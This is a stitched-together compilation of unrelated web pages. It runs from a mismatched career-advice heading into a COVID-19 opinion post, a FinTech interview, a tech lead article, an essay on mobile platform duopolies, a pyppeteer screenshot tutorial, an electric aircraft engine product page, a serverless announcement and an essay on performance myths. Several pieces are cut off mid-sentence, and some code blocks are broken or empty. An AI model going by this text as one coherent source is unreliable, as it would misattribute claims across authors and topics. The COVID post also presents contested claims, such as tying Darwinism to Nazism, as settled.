id="what-advice-do-you-have-for-someone-without-a-cs-degree-who-wants-to-get-their-first-programming-job">What advice do you have for someone without a CS degree who wants to get their first programming job? </h2><p>Don’t work hard (too hard), work smart!

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			




<div><p>After review of the article by an academic, I was prompted to thoughtfully change some of the wording from the original conclusions drawn in order to promote better factual accuracy while still expressing the opinions meant to be expressed.</p></div>



<blockquote><p>Where there is no guidance, a people falls, but in an abundance of counselors there is safety.</p><cite>Proverbs 11:14</cite></blockquote>



<p>COVID-19 is a topic that most of us are tired of hearing about. It has taken a tragic death toll, and I am aware of at least three people who lost a loved one from COVID-19. One of them attended my wedding.</p>



<p>While the situation is unarguably serious and even deadly, the information we receive is muddy, at best. In fact, there is now <a href="https://m.metrotimes.com/news-hits/archives/2020/05/26/michigan-artificially-inflated-its-coronavirus-testing-numbers?fbclid=IwAR1k_cvmmnwbuu_qclHV95L4vnZ6n4PRetErrpL75FzBhHjMGP7SndhOXW0">a report of artificially inflated numbers</a> in at least one state.</p>



<p>I am <strong><em>not</em></strong> saying that the death told estimates we are being told is wrong. I am <strong><em>not</em></strong> saying that we should exercise the precautions that the WHO and CDC have given us. However, I am saying that the transparency in data collection and interpretation seems to be lacking.</p>



<p>What is also lacking is the public promotion of peer-reviewed data models of the sociological consequences of a battered economy, including the number of deaths caused by poverty. It may be out there, but if it is, then it hasn’t been given the same spotlight.</p>



<p>Something is terribly wrong when we ignore the opposing viewpoint of a scientific observation out of hand. Unfortunately, academia appears to be beyond ripe for this type of behavior, as observed in Ben Stein’s documentary <em>Expelled</em>.</p>



<p>If you haven’t seen it, I highly recommend watching the testimonials of a host of qualified scientists who were removed from their academic positions for suggesting the possibility of the world coming from a source of intelligent design. These people didn’t necessarily mention God, mind you. Just academically countering a theory, like all good scientists should. </p>



<p>Countering a hypothesis or theory to test its validity is called “doing your homework”.</p>



<p>Ben Stein’s tongue-in-cheek humor will keep you from falling asleep hearing people talk science…until he establishes the (indirect) link between Nazism and suppression of academic thought, with the common denominator being Darwinism. Then the documentary takes a serious turn. Real serious.</p>



<figure><p>
<iframe title="Expelled: No Intelligence Allowed New Trailer" width="580" height="435" src="https://www.youtube.com/embed/z-L4zp7zGfg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<h4>What’s this got to do with COVID-19? Hang on, I’m getting there…</h4>



<p>A Nobel laureate has stepped forward to say that questioning the current narrative has become politicized and that definitive sourcing has been assigned to an elite few rather than to a highly-qualified international group of professionals.</p>



<p>Skip ahead to 10:56 <a href="https://www.mediatheque.lindau-nobel.org/videos/38691/corona-the-role-of-science-in-times-of-crisis" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">in this video debate</a> to see the major claims by <a aria-label="undefined (opens in a new tab)" href="https://twitter.com/MLevitt_NP2013" target="_blank" rel="noreferrer noopener">Nobel Laureate Michael Levitt</a>.</p>



<p>Levitt is not saying that his observations are absolutely right, mind you, but he is saying that he has made a scientific observation, is standing by the data he has compiled, and is welcoming peer review to challenge the data. Instead of academic review, he has been met with verbal abuse. It would seem that censorship of an opposing scientific observation is alive and well over a decade after <em>Expelled</em> was released.</p>



<p>In other words, I don’t believe we truly did all our homework. Just part of it.</p>



<p>While Dr. Fauci did his best within the scope of his expertise, I don’t believe that he has been able to consult high-caliber professionals outside the scope of his expertise. We may be reacting to observations and a data collection effort that has been unprecedented, but with the missing piece of academically reviewing the antitheses challenging the current narrative, I don’t believe we’re actually doing science. We’re answering a pandemic with too much politics instead. On both sides.</p>



<p>The Scientific Method is missing from the process.</p>



<p>Until we have better peer review of the data compiled from multiple qualified sources, there is a possibility that the margin of error reported in the news is astronomically big, or that it is very small, and because of the lack of sufficient academic oversight there’s no way to know either way.</p>



<p>Until we know for certain how close or how far off we were on the numbers, or until the pandemic sufficiently goes away, I still believe COVID-19 is serious. I’ll still wear a mask where I’m asked to and where I believe it to be prudent. Same with keeping my distance from the sick and the vulnerable. Not because I’m afraid, but because of my worldview as a believer in Jesus. In that worldview, I believe in valuing life over death (Proverbs 8:36), loving our neighbor (Matthew 22:39), obeying our authorities (Romans 13:1), and pursuing peace where possible (Hebrews 12:14). </p>



<p>A little mask over my face is very small inconvenience compared to the hardships our forerunners had to face in order to preserve life and liberty.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p><strong>Can you summarise your experience in the FinTech and RegTech sectors?</strong></p><p>I spent most of my life doing I.T and enterprise software development. I exited my last company in 2007, which I’d founded. For the last ten years, I’ve been focussing on corporate governance. I've been working with boards of directors of all sorts of companies, in all sorts of sectors. Looking particularly at governance in the FinTech, RegTech, Banking and Financial Services sectors.&nbsp;</p><p><strong>What do you think are the biggest unsolved problems and issues in the FinTech sector?</strong></p><p>There’s a lot of talk about Artificial Intelligence. Most applications at the moment are just scratching the surface of AI. So, I think there’s a lot of companies out there looking for people who are AI experts. And a lot of the work they’re doing is quite low level. The opportunity for people in AI is fintech startups. The smaller, more agile companies who can harness that stuff much better than the larger organisations.&nbsp;</p><p>Obviously, things like blockchain, to make things more secure. There’s the whole area of cybersecurity and how you protect these things, especially if they’re going to move into mobile devices, wearables and all the other ways in which we’re going to start accessing financial information. Cyber-security becomes a much bigger deal, as people have found out just with Bank employees working from home. The security implications are massive.&nbsp;</p><p>I think there is an added focus on customer experience. So UI design, how customers will access information from various devices, how we’re going to monitor transactions and make life easier for customers. Banks have had it far too easy. The Challenger banks are offering a much better customer experience.&nbsp;</p><p><strong>What has taken you by surprise about the way the sector has developed over the last ten years?</strong></p><p>Only that it’s taken them so long! The technology has been around forever. If you look at social media platforms – Facebook, Google, Twitter – they’re all ten years old, if not more. So the technology has been around for a while. The big surprise for me is that it has taken so long for it to hit financial services. They’ve got a lot of catching up to do. One of the areas I didn’t mention before is the use of big data. Imagine if you could see all of the financial transactions going on in the world at one time, which is technically feasible, and you could analyse that, then things like money laundering and financial crime would be quite difficult to hide. You’d be able to spot the unusual transactions.&nbsp;</p><p>Having worked with banks in the past, I know how antiquated their systems are. They’re still working on old legacy systems.&nbsp;</p><p><strong>Do you think a lot of the innovation in future will be happening inside these big banks as they catch up? Or do you think there is still room for startups to change the game?</strong></p><p>I think a lot of the innovation will come from startups, but they will be rapidly bought out by the big organisations, who just haven’t got the resources to do it all themselves. There will be a lot of consolidation once the innovations start.&nbsp;</p><p><strong>Is there anything that current startups in the sector are missing?</strong></p><p>As soon as they start competing with banks, for example, startup banks, they will encounter a lot of competition from the people already entrenched in the system. They either get forced out or they get bought up. I think it’s going to be very difficult, in an end to end service like starting your own challenger bank, to be successful and growing to the same size. It’s the race for getting customers which costs a lot of money. You don’t make any money to start with, because you’re trying to get your customer base up. I think what will be a growth area is the intermediaries, people who handle parts of the system.&nbsp;</p><p><strong>Any thoughts on the RegTech sector?</strong></p><p>RegTech goes hand in hand with FinTech, applying the same sort of technology to the regulations that all the banks and insurance companies have to operate within. Most of the major banks, at least 50% of their technology effort is on trying to comply with regulations. And the regulations just get bigger and bigger. The Anti Money Laundering and Know Your Customer, are big ones. If you’re trying to make it easy for people to set up an account, then you’ve got to do those checks very quickly and easily. Another thing is all of the sanctions, particularly the sanctions America puts on countries all over the place, that you have to comply with. Keeping track of all those regulations is a big area. There’s quite a lot of work going on in RegTech to try and make it easier for Banks to comply with the regulations.&nbsp;</p>

                    <p>There's a lot of ambiguity around tech leading. So, it's crucial to define what it is appropriately — or should be. Tech Leads, Technical Leads, or Tech Leaders are software engineers responsible for developing, maintaining, and promoting a project or product's technical vision.</p>
                    <p>Tech Lead's job is far more extensive then coding. Actually, in practice, Tech Leads spend about 30% of time coding, and 70% doing many other essential tasks. They lead one or more teams to succeed from a technical perspective.</p>
                    <p>Therefore, people that care for other aspects of the product are vital allies for Tech Leads. The other way around is also real. Project Managers, Product Managers, Engineering Managers need someone to ensure the project or product meets the functional and non-functional requirements with quality and velocity.</p>
                    <p>However, depending on the company, responsibilities and job descriptions may vary.</p>
                </div>
                <div>
                    <p>Depending on the team's seniority, it requires more attention, more presence in meetings, or more frequent feedback loops. If the company is a startup, there may be very few documented or agreed standards, which requires Tech Leads to spend more time on it then coding or mentoring new members.</p>
                    <p>As it sounds, a tech leader's job is much more about orienting individuals and delivering <a href="https://sourcelevel.io/how-tech-leads-and-team-leads-can-measure-teams-productivity">high-quality code</a> than implementing the software itself. It makes your assignment more intangible, and the impact of your decisions need more time to bring value.</p>
                    <p>Software Engineers can implement a new feature and deploy it to production in one to two weeks. On the other hand, Tech Leads can take months to establish, advocate, and prioritize an architectural solution with the team. The job starts with an idea and goes through a complicated process to get quality code running in the product.</p>

                    <p>As already stated, the responsibilities and expectations vary depending on many aspects. Companies that develop Digital Products need Tech Leads to grant success in the medium and long run.</p>
                    <p>On the other hand, consulting firms and software houses need Tech Leads to drive projects, so they don't fail on delivery. In both cases, Tech Leaders must translate business requirements into technical requirements.</p>
                    <p>From the programming language to architecting the whole system, it's Tech Lead's job to drive the team to success.</p>

                    <h3>Tech Lead's Responsibilities</h3>
                    <p>The following list summarizes everyday responsibilities found in job listings pages. The relevant items in job descriptions usually include:</p>

                        <li>👉 Coordinate and motivate the team members.</li>
                        <li>👉 Take up the technical responsibility of the entire Project or Product. However, more prominent companies group software engineers around parts of the system, and each Tech Lead usually leads one to three teams.</li>
                        <li>👉 Design components and applications according to business requirements. At corporations that miss a Software Architect, Tech Leads may be responsible for designing the whole system.</li>
                        <li>👉 Define, advocate, and implement best practices and coding standards of the team.</li>
                        <li>👉 Work along with other Tech Leads, Product Managers, and Engineering Managers.</li>
                    </ul>
                </div>
                <div>
                    <ul>
                        <li>👉 Promote a collaborative work environment, and keep on asking for <a href="https://sourcelevel.io/everything-about-code-review-from-peer-review-to-automated-code-review">code review</a> and the feedback from the peers.</li>
                        <li>👉 Generate detailed reports with accomplished, planned, and blocked tasks. Some companies may require a simple operational plan to remove impediments.</li>
                        <li>👉 Enable teams to perform tests and integration tests for the entire system in a reliable, secure, and productive way.</li>
                        <li>👉 Identify and mitigate risks, including security risks.</li>
                        <li>👉 Write postmortems for critical bugs, or outage episodes.</li>
                        <li>👉 Work on continually increasing the productivity of the team and reducing the waste on the other end.</li>
                        <li>👉 Always motivate and encourage the team to give their best, especially when they are under pressure.</li>
                        <li>👉 Make yourself completely aware of all the technologies thoroughly, especially those associated with software or application under construction.</li>
                        <li>👉 Actively promote a <a href="https://sourcelevel.io/blog/code-review-a-practice-that-depends-on-the-culture">Code Review culture</a> and review the team's <a href="https://sourcelevel.io/pull-requests-checklists-metrics-and-best-practices-a-definitive-guide">Pull Requests</a>.</li>
                        <li>👉 Share the success and failures with the team.</li>

                    <p>Eryn O'Neil, in her talk,&nbsp;<a href="https://www.youtube.com/watch?v=FcyD85z3JSI">Congrats! You're the tech lead - now what?</a>, organized the practical job of a Tech Lead in three main goals: facilitate, advocate, and motivate.</p>
                    <p>Facilitate is the act of assisting the teams in delivering high-quality software. During the development process, many questions, blocks, and problems arise, and it's a Tech Lead job to guide the team back to safety.</p>
                    <p>It doesn't mean they need to know everything or solve all the issues by themselves. They can and should work together with the team to find great solutions.</p>
                    <p>Advocating is crucial to a Tech Lead. Whether extroverted or not, these professionals should promote discussions and actively participate in meetings.</p>
                    <p>Another essential job is to put everyone on the same page after a new technical decision. The same happens when the product team puts pressure on the engineering team to deliver a new feature as fast as possible.</p>
                </div>
                <div>
                    <p>As a guardian of the best practices and the codebase health, dealing with technical debt is one of the most common tasks of a Technical Leader. Therefore, they also must be involved in the prioritizing process, to endorse the "no" for new features and bring to the top of the list relevant technical debts and refactoring needed.</p>
                    <p>The best way to motivate the team is by empowering them to do the best work possible. It is especially hard when the culture bases on "command and control." This kind of culture also centralizes decisions in Tech Leads, which leads to burnouts and lousy performance.</p>
                    <p>The best way to empower people is to give them freedom and space for innovation while pointing out the pros and cons of proposed solutions. It educates and also helps in sharing ownership of the goals and objectives.</p>
                    <p>Playing this role doesn't mean that they became bosses or the most important person among team members. However, people expect a Tech Lead to take accountability for the team's result, and because of that, they should have leadership skills.</p>

                    <p>The role of Tech Lead is sometimes kind of fuzzy. The technical aspects of software development depend on Software Engineers too. Frequently, it's common to see Senior Software Engineers perform tasks usually attributed to tech leads.</p>
                    <p>The Tech Lead's job, however, is more complicated. It's a full-time job that requires more soft skills than developers usually desire to exert.</p>

                    <p>It's the first goal of a Tech Lead. With a defined technical vision, the team has a horizon, and they will know what to do. With a plan in hand, tech leads can now concentrate on other crucial tasks, like communicating, monitoring progress, and guiding the team.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One of the basic concepts of capitalism is the idea that competition is good for consumers. I think in most cases this is true. One famous example is the <a href="https://en.wikipedia.org/wiki/History_of_General_Motors">history of General Motors</a>, a company that became so powerful and dominant that the US government considered breaking GM into separate companies.</p><p>GM was never broken up, and in the end their dominance waned. Now <a href="https://en.wikipedia.org/wiki/List_of_manufacturers_by_motor_vehicle_production#2017">GM ranks 4th globally</a> in terms of number of vehicles sold, so they hardly went away, but they don’t control anywhere close to the majority of the market.</p><p>How did this happen? There are differing theories: failure to innovate, poor execution, bad strategy. Another, more likely explanation is that Asian manufacturers (Toyota, Hyundai, Honda, Nissan) started producing higher quality, less expensive automobiles than GM, and GM failed to adapt. These competitors chipped away at GM’s dominance.</p><p>In any case, the end result was a win for consumers: more options, higher quality, and lower costs.</p><h2 id="platforms">Platforms</h2><p>Today our digital lives are largely dominated by 2 companies, Apple and Google. They are the only relevant mobile platform vendors, and they both operate walled gardens for their devices. As consumers we have little choice outside of this duopoly.</p><p>In order to publish on Apple or Google’s platform (via their respective app stores), you must first get permission to operate from those companies.</p><p>In other words, if I buy an iPhone, it is Apple who decides what software I can run on my phone. As a publisher, I can’t publish software unless it earns the Apple or Google seal of approval.</p><p>In a sense, we don’t <em>really</em> own the hardware we’re buying.</p><p>To use an analogy, imagine if you bought a Prius and you were only allowed to drive to Toyota approved destinations on Toyota approved roads.</p><h2 id="at-war">At War</h2><p>Apple recently announced it would warn users about apps were tracking users, and provided them a prompt to <em>ask</em> the app not to track them. Some might interpret this as a shot across the bow at ad companies like Google and Facebook who’s main business proposition is the idea that they have high quality targeting data based on behavioural tracking and surveillance.</p><p>Sounds like a win for users, right? Not so fast.</p><p>Amusingly, Apple simultaneously offered their own tool for tracking that would <em>not</em> trigger the warning, <a href="https://uk.reuters.com/article/uk-google-apple/google-backed-groups-criticize-apples-new-warnings-on-user-tracking-idUKKBN2440VG">as per a Reuters article</a>. One could interpret this as a prelude to Apple’s intention to enter the advertising market alongside Google and Facebook. So while it appears on the outside to be a good thing, it’s actually just another attempt by Apple to gain market share.</p><h2 id="the-end-of-the-web">The end of the web</h2><p>Another trend happening simultaneously is the move from open web platforms to app-based walled gardens. You can see this manifested directly in the attempts of major platforms to disable sharing of files and URLs.</p><p>For example, if I share a link on Twitter, it will replace that link with Twitter’s own tracking URL that requires redirection through Twitter’s platform. The same is true for videos (and all files for that matter): you can’t simply attach a file to a tweet and share it. There are ways to download videos from Twitter, but Twitter makes it as hard as possible for you to do that.</p><h2 id="whos-winning">Who’s winning?</h2><p>Without question the biggest winners are the platforms. They’re optimized for stickiness, and the effect has been unquestionably powerful. It’s like going to the grocery store and being allowed to buy as much ice cream as you want, but there are only two flavours available: chocolate or vanilla. All other flavours are bad.</p><figure><img src="https://brndn.io/blog/2020/07/03/platform-wars/are-ya-winning-son_hu5215f8fd9bee4602b34ed414a45f6ba1_69712_1100x1100_fit_q95_lanczos.jpg" width="350"><figcaption><small><em>Winning</em></small></figcaption></figure><p>Unlike the automobile industry, the software world exhibits strong network effects, especially since nearly every platform is some kind of social network.</p><p>Users lose out (or as I like to say, users get used), small publishers lose out, and the amount of diversity of thought and ideas becomes narrow and</p><h2 id="in-the-digital-age-does-ownership-exist">In the digital age, does ownership exist?</h2><p>As I mentioned before, when you buy an iPhone you don’t <em>really</em> own the hardware, since you don’t get to decide what software you run.</p><p>Another example of this effect are DRM-encumbered digital books: you can’t lend them out, and you can sell them to anyone.</p><p>There’s a case in front of the courts right now which <a href="https://www.eff.org/press/releases/eff-and-durie-tangri-join-forces-defend-internet-archives-digital-library">the EFF has promised to help with</a> in attempt to protect our right to lend books, digital or otherwise. It’ll be interesting to watch and see where things go.</p><hr></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainContentOfPage">
		
<p><a href="https://pypi.org/project/pyppeteer/">pyppeteer</a> is a Python port of a headless Chromium browser automation library <a href="https://github.com/puppeteer/puppeteer">puppeteer</a>. It is a very useful tool in general and can be used to perform a number of tasks like web scraping, automation and making website screenshots! The advantage of using an actual browser to create website screenshots is clear: it gives us the very same result people will see in their own browsers.</p>



<p>Once the screenshot is taken, we will use Python imagining library <a href="https://pillow.readthedocs.io/en/stable/">Pillow</a> to resize the resulting image to the size we want. We can call our code in number of ways, but for this example I will use CLI library <a href="https://click.palletsprojects.com/en/7.x/">Click</a>. You can learn more about Click in my other blog post <a href="https://stribny.name/blog/2020/01/building-command-line-interfaces-in-python">Building command-line interfaces in Python</a>.</p>



<p>So let’s begin by installing our dependencies:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f02de2460e91430385182" data-settings=" no-popup minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p>pip install pyppeteer</p><p>pip install pillow</p><p>pip install click</p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->




<p>Pyppeteer will also need a working copy of Chromium, which can be downloaded directly by invoking <code>pyppeteer-install</code> command which will become available after installation.</p>



<p>Once this is done, we can start creating our program. The main code will  start a headless Chromium, navigate to a page we want to capture and save its screenshot to a file of our choosing. The interesting thing is that pyppeteer has asynchronous API, so we will define our function also as asynchronous and later on use Python’s AsyncIO event loop to run it:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f02de2460e99033229922" data-settings=" no-popup minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>async </span><span>def </span><span>capture_screenshot</span><span>(</span><span>url</span><span>:</span><span> </span><span>str</span><span>,</span><span> </span><span>path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>viewport_width</span><span>:</span><span> </span><span>int</span><span>,</span><span> </span><span>viewport_height</span><span>:</span><span> </span><span>int</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>None</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>browser</span><span> </span><span>=</span><span> </span><span>await </span><span>launch</span><span>(</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>page</span><span> </span><span>=</span><span> </span><span>await </span><span>browser</span><span>.</span><span>newPage</span><span>(</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>await </span><span>page</span><span>.</span><span>setViewport</span><span>(</span><span>{</span><span>'width'</span><span>:</span><span> </span><span>viewport_width</span><span>,</span><span> </span><span>'height'</span><span>:</span><span> </span><span>viewport_height</span><span>}</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>await </span><span>page</span><span>.</span><span>goto</span><span>(</span><span>url</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>await </span><span>page</span><span>.</span><span>screenshot</span><span>(</span><span>{</span><span>'path'</span><span>:</span><span> </span><span>path</span><span>}</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>await </span><span>browser</span><span>.</span><span>close</span><span>(</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->




<p>The code is very straightforward due to the pyppeteer’s simple API. The important decision here is that we want to be able to provide browser’s viewport dimensions. Unless set to a proper screen size, Chromium would start with a very small window and the screenshot would be useless.</p>



<p>After the screenshot is saved, we want to resize it to a size for publishing, so for that let’s implement a resize_screenshot function:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f02de2460e9b013495414" data-settings=" no-popup minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>def </span><span>resize_screenshot</span><span>(</span><span>original_path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>resized_path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>width</span><span>:</span><span> </span><span>int</span><span>,</span><span> </span><span>height</span><span>:</span><span> </span><span>int</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>None</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span> </span><span>=</span><span> </span><span>Image</span><span>.</span><span>open</span><span>(</span><span>original_path</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span>.</span><span>thumbnail</span><span>(</span><span>(</span><span>width</span><span>,</span><span> </span><span>height</span><span>)</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span>.</span><span>save</span><span>(</span><span>resized_path</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->




<p>To tie it all together, we will use Click to implement a command. This command will allow us to change all of the parameters we need: the URL, viewport size, final screenshot size and the filenames used for saving the images:</p>

<!-- [Format Time: 0.0009 seconds] -->




<p>As our capture_screenshot function is async, we had to create AsyncIO event loop to invoke it. You can see the whole working example including the imports in my <a href="https://github.com/stribny/python-screenshots/blob/master/main.py">python-screenshots</a> repository.</p>



<p>To run the program, simply invoke our screenshot command:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f02de2460ea0127996447" data-settings=" no-popup minimize scroll-mouseover">

					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->




<p>And this is all! By default, screenshot.png and screenshot_resized.png files will be saved in the project directory for further processing.</p>

        <div itemprop="text">
<p><span><strong><span><span>E-811: The first type-certified electric engine for use on General Aviation aircraft</span></span></strong></span></p>
<p>The E-811 is the first electric engine certified for use in General Aviation by the European Union Aviation Safety Agency (EASA). Enjoy the benefits of a type-certified electric engine or boost the development process of your powered sailplane, UL, LSA, VLA or Part‑23 Level-1 aircraft.</p>
<p>The E-811 engine combines a liquid-cooled electric motor and a liquid-cooled power controller. Offering 57.6 kW (77 hp) of peak power, and 49.2 kW (66 hp) of maximum continuous power, the E-811 is the ideal powerplant for powered sailplanes, UL, LSA and VLA aircraft, where a Type Certified Engine is required. It may also be installed on Part-23 Level 1 aircraft and other distributed propulsion applications by applying the corresponding special conditions.</p>
<p><img src="https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-294x300.png" alt="" width="294" height="300" srcset="https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-294x300.png 294w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-768x784.png 768w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-36x36.png 36w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-691x705.png 691w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top-450x459.png 450w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/268MVLC_top.png 919w" sizes="(max-width: 294px) 100vw, 294px"></p>
<p>The propulsion motor is a state-of-the-art axial flux synchronous permanent magnet electric motor. Lighter and more compact, these motors are also more powerful than radial flux motors, making them ideal for their application in aviation. The propeller is mounted directly on its rotor.</p>
<p>The associated controller converts direct current (DC) from the batteries to alternating current (AC) for the motor. The controller receives torque command via CAN bus and adjusts the motor current input accordingly through the engine’s high voltage AC bus. The motor reacts instantaneously and without hesitation. The controller also requires a 12-volts power supply.</p>
<p><img src="https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-300x226.png" alt="" width="300" height="226" srcset="https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-300x226.png 300w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-768x579.png 768w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-1030x777.png 1030w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-705x532.png 705w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45-450x339.png 450w, https://www.pipistrel-aircraft.com/wp-content/uploads/2020/06/H300C_45.png 1314w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p><strong>Flexibility</strong></p>
<p>The motor’s rotation direction is not factory selected and can be easily adapted to any given application as part of the installation. The motor can turn clockwise or counter-clockwise as the default direction of rotation.</p>
<p>The E-811 supports a wide range of propellers. Fixed, ground-adjustable and electric variable-pitch propellers can be mounted on the engine, as long as they are compatible with the flange geometry and screw pattern (6xM8 on 75 mm diameter). Hydraulic governors are not supported. The propeller should have a maximum moment of inertia of 3245 kg-cm<sup>2</sup> (7.7 lb-ft<sup>2</sup>) and weigh less than 5.5 kg. Maximum engine speed is 2500 rpm. A propeller that meets the E-811 engine technical specifications and limitations is available to order or can be specially designed at Pipistrel.</p>
<p><strong>Cooling system and additional installation equipment</strong></p>
<p>The engine is entirely liquid-cooled through a single cooling circuit with a mixture of 50% water and 50% glycol (automotive grade G12+). The coolant inlet is located on the power controller, it then proceeds to the motor via an intermediate coolant hose. The coolant outlet is located on the motor.</p>
<p>The cooling system is part of the installation and can be provided by Pipistrel. It comprises the following components: a coolant pump; a radiator; an expansion tank; an overflow bottle; inlet, outlet and intermediate hoses; and the coolant itself. The circuit shall ensure a coolant temperature at either component of less than 60°C.</p>
<p>In order to control the engine power output, an auxiliary control system should be provided. This can be ensured either by a power lever or a flight control computer, while cockpit indication such as an RPM indicator shall be provided as well. Different solutions are available to complement your installation, please inquire about different options which Pipistrel can deliver.</p>
<p>The engine requires high-voltage DC power to be supplied for propulsive force. Depending on the chosen architecture, the engine will accept DC power from the energy source, which may be batteries connected via a battery management system (BMS), or a generator, or a fuel cell, or combinations thereof. A low-voltage (12 VDC) power connection is also needed.</p>
<p>Installation of the additional equipment depends on the aircraft configuration. Its suitability for the E-811 engine must be demonstrated within the scope of the type certification of the aircraft.</p>

			<p><strong>Serverless</strong> gives us the power to focus on delivering value to our customers without worrying about the maintenance and operations of the underlying compute resources. Cloud providers (like AWS), also give us a huge number of managed services that we can stitch together to create incredibly powerful, and massively scalable serverless microservices.</p>
<p>Almost 2 years ago now, I wrote a post on <strong><a href="https://www.jeremydaly.com/serverless-microservice-patterns-for-aws/">Serverless Microservice Patterns for AWS</a></strong> that became a popular reference for newbies and serverless veterans alike. The capabilities of serverless have changed dramatically since then, opening up a ton of new patterns and possibilities. Today I’m announcing the <a href="https://www.jeremydaly.com/serverless-reference-architectures/"><strong>Serverless Reference Architectures Project</strong></a>. This project is intended to capture, share, explore, and debate the patterns and practices being used in serverless production applications today.<span id="more-2764"></span></p>
<p>To really understand what’s going on, it’s useful to take a bird’s-eye view of a pattern, understand how data flows back and forth through the different components, and think about the implications on your application. I’ve created interactive architectures that let you explore the details of each component and walk you through the different steps.</p>
<p>You also need to understand how a pattern would come alive with AWS services and how you can configure it for your implementation. I’ve partnered with <strong><a href="https://www.stackery.io/" target="_blank" rel="noopener">Stackery</a></strong> and integrated their interactive canvas so that you can explore these patterns, customize them, and generate updated SAM templates automatically.</p>
<p>Finally, you want to understand how you’d replicate the pattern in production using infrastructure-as-code to ensure repeatable, safe deployments. You’re free to use the generated SAM templates, or take advantage of community supplied templates for the Serverless Framework, CDK, and others.</p>
<p>This project hopes to encapsulate all of this in one place so you can start by learning about the pattern fundamentals, then go all the way through to deploying a functional version of the pattern into your own AWS account (all with just a few clicks).</p>
<p>By partnering on sharing common serverless reference architectures and patterns, we can help others unlock the true power of serverless with AWS. We are starting with just a few patterns, but I plan on adding several more and hope that <a href="https://github.com/jeremydaly/reference-architectures" target="_blank" rel="noopener"><strong>you will contribute</strong></a> as well.</p>
<p><strong><a href="https://www.jeremydaly.com/serverless-reference-architectures/">Give it a try</a>, and let me know what you think!</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago I was pulled into a discussion about the speed and magic optimizations
of a particular container within the standard library of a coworker’s programming
language of choice. They were claiming how there is a special container
that somehow magically performs better than a normal array when it’s used for
adding a number to every element within that container.</p><p>For some reason in a corporate world you will always find such pieces
of wisdom floating around. The standard library is treated as some kind of a
magic box that performs an order of magnitude better than whatever you could
ever program yourself.</p><p>I don’t believe in witchcraft though. A memory access is a memory access and unless you figure out
a more efficient algorithm for performing your operation, this magic container
is not going to perform any faster. So I convinced this person to write an actual program that will compare their magic
container with an every day array. Lo’ and behold my favorite
optimization technique that could be summed as “when in doubt use a for loop
and iterate over array” proved to be right. The thing compiled into more or
less the same thing, while an array solution performed slightly better on average.</p><p>It just goes to show how the software industry excels at regurgitating myths instead
of sitting down and thinking really hard about the problem at hand. I partially
blame this culture on the pervasive money making industry, which likes to spoon
feed scholars with random bits of trivia instead of actually making them think.
You also know it under the name of higher education.</p><p>When you know nothing at all, being spoon fed the knowledge is a great way to become
aware of the vast field around you. As soon as you gather enough knowledge to be dangerous,
you start to realize how Gell-Mann amnesia effect is a real thing and most
of the world is broken [1].</p><p>Since young people are being spoon fed knowledge for a tremendously large chunk of their life,
